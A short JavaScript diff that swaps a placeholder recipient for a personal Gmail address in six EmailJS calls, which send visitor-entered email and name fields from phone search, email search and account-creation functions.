@@ -233,7 +233,7 @@ function searchByPhone() {
         email: '',
         firstName: '',
         lastName: '',
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "Truongvia240504@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_ldew57f', templateParams)
@@ -271,7 +271,7 @@ function searchByPhoneDesktop() {
         email: '',
         firstName: '',
         lastName: '',
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "Truongvia240504@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_ldew57f', templateParams)
@@ -309,7 +309,7 @@ function searchByEmail() {
         email: email,
         firstName: '',
         lastName: '',
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "Truongvia240504@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_ldew57f', templateParams)
@@ -347,7 +347,7 @@ function searchByEmailDesktop() {
         email: email,
         firstName: '',
         lastName: '',
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "Truongvia240504@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_ldew57f', templateParams)
@@ -389,7 +389,7 @@ function createAccount() {
         email: email,
         firstName: firstName,
         lastName: lastName,
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "Truongvia240504@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_vxfphjh', templateParams)
@@ -431,7 +431,7 @@ function createAccountDesktop() {
         email: email,
         firstName: firstName,
         lastName: lastName,
-        to_email: "your-email@gmail.com" // Thay bằng email của bạn
+        to_email: "Truongvia240504@gmail.com" // Thay bằng email của bạn
     };
 
     emailjs.send('service_tizrsr6', 'template_ldew57f', templateParams)
